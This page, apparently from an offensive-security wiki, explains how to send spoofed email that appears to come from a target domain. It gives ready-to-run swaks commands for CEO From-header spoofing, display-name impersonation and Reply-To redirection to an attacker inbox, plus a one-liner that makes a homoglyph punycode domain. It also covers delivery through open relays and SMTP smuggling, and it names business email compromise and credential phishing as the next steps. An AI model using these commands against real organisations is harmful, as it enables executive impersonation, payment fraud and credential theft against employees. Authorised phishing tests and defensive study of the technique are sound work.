---
title: "Sender spoofing: crafting mail that appears to come from a target domain"
description: "The payoff page for sender authentication: craft and send a spoofed message with swaks once SPF, DKIM, or DMARC is missing or weak, and the header and lookalike tricks that need no record gap at all, display-name spoofing, RFC5322.From versus RFC5321.MailFrom mismatch, Reply-To redirection, and homoglyph punycode cousin domains, delivered through open relays or SMTP smuggling."
keywords:
  - sender spoofing
  - email spoofing
  - display name spoofing
  - punycode domain
  - swaks
  - reply-to
---

# Sender spoofing

This is where the reading from [SPF](spf.md), [DKIM](dkim.md), and [DMARC](dmarc.md) turns into a delivered message. There are two families of technique. The first exploits a record gap so the spoofed `From:` domain passes authentication outright. The second needs no gap at all: it abuses how mail clients render a message, so even a domain with `p=reject` and strict alignment can be impersonated convincingly to the human reading it.

## Mechanism: the two From identities

Every message has two sender identities, and they are checked and displayed differently:

- **RFC5321.MailFrom** is the envelope `MAIL FROM`, the return-path. SPF is checked against its domain. The recipient almost never sees it.
- **RFC5322.From** is the `From:` header. This is what the mail client displays. DMARC alignment is judged against its domain.

`swaks` sets both from `--from` by default. Overriding the header independently (`--header "From: ..."`) is what creates the mismatch that spoofing depends on: you pass SPF on a domain you control while the recipient sees the target's domain.

## Worked: spoof with a record gap

When the target's SPF allows your sender, or DKIM is forgeable, or DMARC is `p=none`/absent, put the target domain in the `From:` header and send. Use a relay or MX that will accept the transaction (see delivery paths below):

```bash
swaks --to victim.employee@target.com \
      --from ceo@victim.com \
      --header "From: \"Jane Doe\" <ceo@victim.com>" \
      --header "Subject: Approval needed before 5pm" \
      --header "Date: $(date -R)" \
      --header "Message-ID: <$(openssl rand -hex 12)@victim.com>" \
      --body "Jane, can you action the attached before end of day?" \
      --server <relay-or-mx> --ehlo victim.com
# read the delivered Authentication-Results: dmarc=pass / dmarc=none confirms it survived
```

The aligned-pass path depends on which gap you used: envelope domain accepted by a permissive SPF, a forged/replayed DKIM signature that aligns, or simply the absence of an enforcing DMARC policy. Confirm by reading `Authentication-Results:` in the delivered message and whether it reached the inbox.

## Worked: display-name spoofing (no record gap)

Most mail clients show the display name prominently and hide or truncate the actual address. A message that is fully authenticated for a throwaway domain can still present a trusted name:

```bash
swaks --to victim.employee@target.com \
      --from attacker@sender-you-control.com \
      --header "From: \"Jane Doe (CEO, Victim Corp)\" <attacker@sender-you-control.com>" \
      --header "Subject: quick favor" \
      --body "Are you at your desk?" \
      --server mx.target.com
```

Here SPF, DKIM, and DMARC all pass for `sender-you-control.com` (which you configure correctly), so the message is clean by every check, yet the recipient's client renders "Jane Doe (CEO, Victim Corp)". On mobile clients that show only the display name this is often indistinguishable from the real sender.

## Worked: Reply-To redirection

Pair any of the above with a `Reply-To:` that points at an inbox you control, so a reply to the trusted-looking message goes to you even though the `From:` carries the target's name:

```bash
swaks --to victim.employee@target.com \
      --from attacker@sender-you-control.com \
      --header "From: \"Jane Doe\" <ceo@victim.com>" \
      --header "Reply-To: Jane Doe <jane.doe.ceo@proton.me>" \
      --header "Subject: Re: vendor payment" \
      --body "Reply here, I am away from my usual mail." \
      --server mx.target.com
```

## Worked: lookalike and homoglyph domains

Cousin domains are outside the target's DMARC scope because they are a different organizational domain, so a domain you register and fully authenticate passes every check. Two variants:

- **Typo/cousin**: register `victim-corp.com`, `victimcorp.com`, `victim-support.com`, publish real SPF/DKIM/DMARC, and send authenticated mail. Everything is `pass`; only the eye catches it.
- **IDN homoglyph (punycode)**: register a name using Unicode characters that render like the target's. Generate the ASCII-compatible `xn--` label and register it:

```bash
# a Cyrillic 'а' (U+0430) in place of Latin 'a' renders identically in many fonts
python3 -c "d='vаlue.com'; print(d.encode('idna').decode())"   # -> xn--vlue-8kd.com (register this)
```

Sending from the punycode domain, clients that render the Unicode form show the target's name in the address itself.

## Delivery paths

The spoofed message still needs a server that will accept and forward it:

- **Direct to the recipient MX**: works whenever the recipient's inbound server accepts the transaction (`--server mx.target.com`). Fine for record-gap and display-name spoofs that pass on their own identity.
- **Open relay**: a misconfigured server that forwards mail for arbitrary senders gives you a third-party egress and sometimes a trusted source IP. See [open relay](../protocols/smtp/open-relay.md).
- **SMTP smuggling**: exploiting end-of-data disagreement between a trusting outbound relay and the inbound server to inject a second, spoofed transaction that inherits the relay's authenticated, DMARC-aligned identity. See [SMTP smuggling](../protocols/smtp/smtp-smuggling.md).

## Follow-on

A delivered, trusted-looking message is the entry point, not the goal. The common next moves are business email compromise (impersonating an executive or supplier to redirect a wire transfer or change payment details in an existing thread) and credential phishing (a spoofed notice linking to a cloned login page that captures credentials or an MFA token). Both rely on the `From:` the recipient trusts, which is what this page produces; the content, thread context, and landing page are the rest of the operation.

## Tools

- [swaks](https://github.com/jetmore/swaks)
- [Gophish](https://github.com/gophish/gophish)
- [Swaks header reference](https://jetmore.org/john/code/swaks/)

## References

- [RFC 5322 section 3.6.2 (originator fields: From and Reply-To)](https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.2)
- [RFC 7489 (DMARC, identifier alignment and From)](https://datatracker.ietf.org/doc/html/rfc7489)
- [SEC Consult: SMTP smuggling, spoofing e-mails worldwide](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
